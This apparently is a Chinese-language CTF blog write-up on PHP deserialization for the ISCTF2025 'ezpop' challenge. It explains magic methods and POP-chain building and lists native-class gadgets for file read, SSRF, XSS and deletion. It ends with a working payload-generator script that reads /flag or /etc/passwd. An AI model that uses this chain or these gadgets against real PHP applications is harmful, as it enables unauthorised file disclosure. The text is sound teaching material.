@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>PHP反序列化漏洞 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="PHP 反序列化基础 ISCTF2025 Web&#x2F;ezpop   题目：ISCTF2025 Web&#x2F;ezpop考点：pop 链 + PHP 原生类利用   一些魔术方法   魔术方法 触发时机 常见危险操作    __construct() new 时 初始化   __destruct() 对象销毁（引用计数归零 &#x2F; 脚本结束时） 几乎必被触发，POP 链的天然入口   __t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化漏洞">
+<meta property="og:url" content="http://example.com/2026/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E4%B8%8Eezpop-Writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="PHP 反序列化基础 ISCTF2025 Web&#x2F;ezpop   题目：ISCTF2025 Web&#x2F;ezpop考点：pop 链 + PHP 原生类利用   一些魔术方法   魔术方法 触发时机 常见危险操作    __construct() new 时 初始化   __destruct() 对象销毁（引用计数归零 &#x2F; 脚本结束时） 几乎必被触发，POP 链的天然入口   __t">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-11-09T11:30:00.000Z">
+<meta property="article:modified_time" content="2026-11-11T12:01:04.946Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="php反序列化">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-PHP反序列化基础与ezpop-Writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E4%B8%8Eezpop-Writeup/" class="article-date">
+  <time class="dt-published" datetime="2026-11-09T11:30:00.000Z" itemprop="datePublished">2026-11-09</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      PHP反序列化漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP-反序列化基础"><a href="#PHP-反序列化基础" class="headerlink" title="PHP 反序列化基础"></a>PHP 反序列化基础</h1><p> ISCTF2025 Web&#x2F;ezpop </p>
+<blockquote>
+<p>题目：ISCTF2025 <code>Web/ezpop</code><br>考点：pop 链 + PHP 原生类利用</p>
+</blockquote>
+<hr>
+<h2 id="一些魔术方法"><a href="#一些魔术方法" class="headerlink" title="一些魔术方法"></a>一些魔术方法</h2><table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>触发时机</th>
+<th>常见危险操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__construct()</code></td>
+<td><code>new</code> 时</td>
+<td>初始化</td>
+</tr>
+<tr>
+<td><code>__destruct()</code></td>
+<td>对象销毁（引用计数归零 &#x2F; <strong>脚本结束时</strong>）</td>
+<td>几乎必被触发，POP 链的天然入口</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>对象被<strong>当字符串用</strong>：<code>echo $obj</code>、<code>$a . $obj</code>、<code>&quot;$obj&quot;</code>、<code>strlen($obj)</code>、与字符串比较</td>
+<td>拼接、输出</td>
+</tr>
+<tr>
+<td><code>__invoke()</code></td>
+<td>对象被<strong>当函数调</strong>：<code>$obj()</code>、<code>call_user_func($obj)</code>、<code>array_map($obj,...)</code></td>
+<td>命令执行</td>
+</tr>
+<tr>
+<td><code>__get()</code></td>
+<td>读<strong>不存在&#x2F;不可访问</strong>的属性：<code>$obj-&gt;noSuchProp</code></td>
+<td><code>$this-&gt;x-&gt;y(...)</code> 继续跳</td>
+</tr>
+<tr>
+<td><code>__set()</code></td>
+<td>给不存在&#x2F;不可访问属性<strong>赋值</strong></td>
+<td>二次注入</td>
+</tr>
+<tr>
+<td><code>__isset()</code> &#x2F; <code>__unset()</code></td>
+<td><code>isset($obj-&gt;p)</code> &#x2F; <code>unset($obj-&gt;p)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>__call()</code></td>
+<td>调用<strong>不存在的方法</strong>：<code>$obj-&gt;noMethod()</code></td>
+<td>中转</td>
+</tr>
+<tr>
+<td><code>__callStatic()</code></td>
+<td>调用不存在的静态方法</td>
+<td></td>
+</tr>
+<tr>
+<td><code>__sleep()</code></td>
+<td><code>serialize()</code> 时</td>
+<td></td>
+</tr>
+<tr>
+<td><code>__wakeup()</code></td>
+<td><code>unserialize()</code> 时（<strong>注意：在反序列化阶段就执行</strong>）</td>
+<td>历史上常用 <code>C:</code> 序列化或改属性个数绕过</td>
+</tr>
+<tr>
+<td><code>__unserialize()</code> &#x2F; <code>__serialize()</code></td>
+<td>PHP 7.4+ 的新序列化协议</td>
+<td></td>
+</tr>
+<tr>
+<td><code>__clone()</code></td>
+<td><code>clone</code> 时</td>
+<td></td>
+</tr>
+<tr>
+<td><code>__debugInfo()</code></td>
+<td><code>var_dump()</code> 时</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>最重要的一条：<code>unserialize()</code> 不会调用 <code>__construct</code>（构造函数被跳过），但对象一旦被创建成功，脚本结束时就一定会被销毁 → <code>__destruct</code> 必然执行。</strong></p>
+<p>所以题目里 <code>__destruct</code> 一般都是链子的入口，<code>__construct</code> 里的校验通常是”写了但不生效”的假防守。</p>
+<hr>
+<h2 id="POP-链"><a href="#POP-链" class="headerlink" title="POP 链"></a>POP 链</h2><h3 id="1-找链的方法："><a href="#1-找链的方法：" class="headerlink" title="1 找链的方法："></a>1 找链的方法：</h3><p>每一条跳都是同一个模式：</p>
+<blockquote>
+<p>代码里把某个属性 <strong>以某种方式使用</strong> → 那个属性对应的位置上，你放的是一个<strong>对象</strong> → PHP 自动触发该对象的某个魔术方法。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>代码里的写法</th>
+<th>触发的魔术方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>echo $this-&gt;x;</code> &#x2F; <code>$s = &quot;a&quot;.$this-&gt;x;</code></td>
+<td><code>x::__toString</code></td>
+</tr>
+<tr>
+<td><code>$f = $this-&gt;x; $f();</code> &#x2F; <code>call_user_func($this-&gt;x)</code></td>
+<td><code>x::__invoke</code></td>
+</tr>
+<tr>
+<td><code>$this-&gt;x-&gt;y;</code>（<code>y</code> 属性不存在）</td>
+<td><code>x::__get</code></td>
+</tr>
+<tr>
+<td><code>$this-&gt;x-&gt;y();</code>（<code>y</code> 方法不存在）</td>
+<td><code>x::__call</code></td>
+</tr>
+<tr>
+<td><code>$this-&gt;x-&gt;y = 1;</code>（外部赋不可见属性）</td>
+<td><code>x::__set</code></td>
+</tr>
+<tr>
+<td><code>new $this-&gt;x(...)</code> &#x2F; <code>new $class(...)</code>（<code>$class</code> 可控）</td>
+<td>任意类的构造 → 原生类 gadget</td>
+</tr>
+</tbody></table>
+<h3 id="2-常见组合套路"><a href="#2-常见组合套路" class="headerlink" title="2 常见组合套路"></a>2 常见组合套路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__destruct  → __toString   （destruct 里 echo / 拼接属性）</span><br><span class="line">__toString  → __invoke     （toString 里把属性当函数调）</span><br><span class="line">__invoke    → __get        （invoke 里访问不存在的属性）</span><br><span class="line">__destruct  → __call       （destruct 里调不存在的方法）</span><br><span class="line">__wakeup    → ...          （反序列化阶段就触发，无需等脚本结束）</span><br><span class="line">__get / __set              （常作中转，里面还能 new / array_walk / 回调）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="原生类-gadget"><a href="#原生类-gadget" class="headerlink" title="原生类 gadget"></a>原生类 gadget</h2><p>“原生类”&#x3D; PHP 内置的类（<code>SplFileObject</code>、<code>DirectoryIterator</code>、<code>SoapClient</code>……）。它们不需要你在题目里 new 出来，链子能 <code>new 任意类</code> 就能直接借来用。</p>
+<p>本题的借法藏在 <code>eenndd::__get</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">        <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);     <span class="comment">// ← 属性名当类名，属性值当构造参数</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="array-walk-this-callback-的隐藏行为"><a href="#array-walk-this-callback-的隐藏行为" class="headerlink" title="array_walk($this, callback) 的隐藏行为"></a><code>array_walk($this, callback)</code> 的隐藏行为</h3><p><code>array_walk</code> 的第一个参数 <strong>可以是对象</strong>，此时 PHP 会把对象的<strong>属性</strong>当数组遍历，回调收到：</p>
+<ul>
+<li><code>$day1</code> &#x3D; 属性<strong>值</strong></li>
+<li><code>$day2</code> &#x3D; 属性<strong>名</strong></li>
+</ul>
+<p>实测（PHP 8.1）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;<span class="built_in">SplFileObject</span> = <span class="string">&#x27;/tmp/myflag&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;other = <span class="string">&#x27;v2&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$o</span>, function (<span class="variable">$v</span>, <span class="variable">$k</span>) &#123; <span class="keyword">echo</span> <span class="string">&quot;CB: <span class="subst">$k</span> =&gt; <span class="subst">$v</span>\n&quot;</span>; &#125;);</span><br><span class="line"><span class="comment">// CB: SplFileObject =&gt; /tmp/myflag</span></span><br><span class="line"><span class="comment">// CB: other =&gt; v2</span></span><br></pre></td></tr></table></figure>
+
+<p>于是 <code>new $day2($day1)</code> 就等于 <code>new SplFileObject(&#39;/tmp/myflag&#39;)</code>，<code>foreach</code> 遍历 <code>SplFileObject</code> 会<strong>逐行读出文件内容</strong>并 echo 出来。</p>
+<p><strong>取巧点：反序列化时属性名不受 <code>$</code> 声明限制</strong>，可以塞任意名字，所以属性名可以是任意类名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;<span class="built_in">SplFileObject</span> = <span class="string">&#x27;/flag&#x27;</span>;        <span class="comment">// 属性名 = 类名，属性值 = 路径</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常用的原生类-gadget-清单"><a href="#常用的原生类-gadget-清单" class="headerlink" title="常用的原生类 gadget 清单"></a>常用的原生类 gadget 清单</h3><table>
+<thead>
+<tr>
+<th>原生类</th>
+<th>效果</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SplFileObject($path)</code></td>
+<td>逐行读文件（<code>foreach</code>）</td>
+<td>本题用的</td>
+</tr>
+<tr>
+<td><code>SplFileObject(&quot;php://filter/convert.base64-encode/resource=/flag&quot;)</code></td>
+<td>base64 读源码&#x2F;文件</td>
+<td>支持流封装器</td>
+</tr>
+<tr>
+<td><code>DirectoryIterator($dir)</code></td>
+<td>列目录</td>
+<td></td>
+</tr>
+<tr>
+<td><code>FilesystemIterator($dir)</code></td>
+<td>列目录（带更多信息）</td>
+<td></td>
+</tr>
+<tr>
+<td><code>GlobIterator(&quot;glob:///etc/*&quot;)</code></td>
+<td>通配符匹配文件名</td>
+<td></td>
+</tr>
+<tr>
+<td><code>SimpleXMLElement($xml)</code></td>
+<td>XXE 读文件</td>
+<td>需要 libxml，PHP 8+ 默认禁外部实体</td>
+</tr>
+<tr>
+<td><code>SoapClient(null, [&#39;location&#39;=&gt;..., &#39;uri&#39;=&gt;...])</code></td>
+<td>SSRF</td>
+<td>需开 soap 扩展</td>
+</tr>
+<tr>
+<td><code>Error($msg, $code)</code> &#x2F; <code>Exception</code></td>
+<td><code>echo $obj</code> → XSS</td>
+<td>配合 <code>__toString</code></td>
+</tr>
+<tr>
+<td><code>ZipArchive</code></td>
+<td>配合 <code>unlink</code> 删文件</td>
+<td></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);                                  <span class="comment">// 报错被吞，payload 写错时表现为&quot;空白页&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123; <span class="variable language_">$this</span>-&gt;var1 = <span class="variable">$a</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;var1; &#125;                     <span class="comment">// ① 入口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123; <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;var2; <span class="keyword">return</span> <span class="variable">$newFunc</span>(); &#125;  <span class="comment">// ② var2 当函数调</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var4</span>; <span class="keyword">public</span> <span class="variable">$var5</span>; <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123; <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;var4; <span class="keyword">return</span> <span class="variable">$function</span>(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123; <span class="variable language_">$this</span>-&gt;var5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var6</span>; <span class="keyword">public</span> <span class="variable">$var7</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123; <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;var6-&gt;<span class="title function_ invoke__">add</span>(); <span class="keyword">return</span> <span class="variable">$long</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123; <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var7-&gt;tt2) &#123; <span class="keyword">echo</span> <span class="string">&quot;yamada yamada&quot;</span>; &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);                <span class="comment">// ④ 属性名当类名</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123; <span class="keyword">echo</span>(<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>); &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span> = <span class="string">&quot;1145&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;                     <span class="comment">// ③ 闸门</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>) &#123; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var10-&gt;hey; &#125;   <span class="comment">// hey 不存在 → __get</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yamada</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var12</span>; <span class="keyword">private</span> <span class="variable">$var13</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var13 == <span class="string">&quot;xxx&quot;</span>) &#123; <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;var12); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123; <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>]); &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); &#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>类</th>
+<th>有效 gadget？</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>begin</code></td>
+<td>入口</td>
+<td><code>__destruct</code> 里 <code>echo $var1</code>（对象→<code>__toString</code>）；<code>__toString</code> 里 <code>$var2()</code>（对象→<code>__invoke</code>）</td>
+</tr>
+<tr>
+<td><code>flaag</code></td>
+<td>中转 + 闸门</td>
+<td><code>__invoke</code> 通过后 <code>$this-&gt;var10-&gt;hey</code>（属性不存在 → <code>__get</code>）</td>
+</tr>
+<tr>
+<td><code>eenndd</code></td>
+<td>终点</td>
+<td><code>array_walk($this,...)</code> + <code>new $day2($day1)</code> → <code>SplFileObject</code></td>
+</tr>
+<tr>
+<td><code>starlord</code></td>
+<td>干扰</td>
+<td><code>__call</code>&#x2F;<code>__get</code> 里没有能接上本链的操作</td>
+</tr>
+<tr>
+<td><code>anna</code></td>
+<td>干扰</td>
+<td><code>__toString</code>&#x2F;<code>__set</code> 走不到危险点</td>
+</tr>
+<tr>
+<td><code>yamada</code></td>
+<td>干扰</td>
+<td><code>__set</code> 里只有 <code>strtolower</code>，无输出</td>
+</tr>
+</tbody></table>
+<p>入口：<code>POST</code> 参数名 <strong><code>ISCTF</code><strong>，值直接进 <code>unserialize()</code>，</strong>没有任何过滤</strong>。</p>
+<hr>
+<h2 id="链的推演"><a href="#链的推演" class="headerlink" title="链的推演"></a>链的推演</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">① begin::__destruct()      echo $this-&gt;var1          → var1 是 begin 对象时触发</span><br><span class="line">② begin::__toString()      $newFunc = $this-&gt;var2; $newFunc();  → var2 是 flaag 对象时触发</span><br><span class="line">③ flaag::__invoke()        if (md5(md5($var11)) == 666) return $this-&gt;var10-&gt;hey;</span><br><span class="line">                                                       → var10 是 eenndd 对象、hey 属性不存在时触发</span><br><span class="line">④ eenndd::__get()          array_walk → new SplFileObject(&#x27;/flag&#x27;) → foreach echo</span><br></pre></td></tr></table></figure>
+
+<p>对象图:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">begin #1  (var1 = begin #2)</span><br><span class="line">  └─ begin #2  (var2 = flaag)</span><br><span class="line">       └─ flaag  (var10 = eenndd, var11 = sWiJgunG)</span><br><span class="line">            └─ eenndd  (SplFileObject = &quot;/flag&quot;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>begin #1</code> 的 <code>__destruct</code> 里 <code>echo $var1</code> → <code>var1</code> 放 <code>begin #2</code> 对象 → 触发 <code>begin #2::__toString</code></li>
+<li><code>begin #2::__toString</code> 里 <code>$newFunc = $var2; return $newFunc()</code> → <code>var2</code> 放 <code>flaag</code> 对象 → 触发 <code>flaag::__invoke</code></li>
+<li><code>flaag::__invoke</code> 过闸门后 <code>$this-&gt;var10-&gt;hey</code> → <code>var10</code> 放 <code>eenndd</code>，<code>hey</code> 属性不存在 → 触发 <code>eenndd::__get</code></li>
+<li><code>eenndd::__get</code> 里 <code>array_walk</code> 遍历自己的属性 → 属性名 <code>SplFileObject</code>、值 <code>/flag</code> → <code>new SplFileObject(&#39;/flag&#39;)</code> → 逐行 echo</li>
+</ul>
+<hr>
+<h2 id="payload-的生成"><a href="#payload-的生成" class="headerlink" title="payload 的生成"></a>payload 的生成</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var1</span>; <span class="keyword">public</span> <span class="variable">$var2</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var10</span>; <span class="keyword">public</span> <span class="variable">$var11</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$SplFileObject</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;<span class="built_in">SplFileObject</span> = <span class="variable">$argv</span>[<span class="number">1</span>] ?? <span class="string">&#x27;/flag&#x27;</span>;   <span class="comment">// 目标文件，可改 /flag、/etc/passwd...</span></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flaag</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;var10 = <span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;var11 = <span class="string">&#x27;sWiJgunG&#x27;</span>;                    <span class="comment">// md5(md5) = 666aae67... → PHP7 下 == 666</span></span><br><span class="line"><span class="variable">$b2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$b2</span>-&gt;var2 = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$b1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$b1</span>-&gt;var1 = <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SERIALIZED:\n<span class="subst">$ser</span>\n\nURLENCODED:\n&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="variable">$ser</span>), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
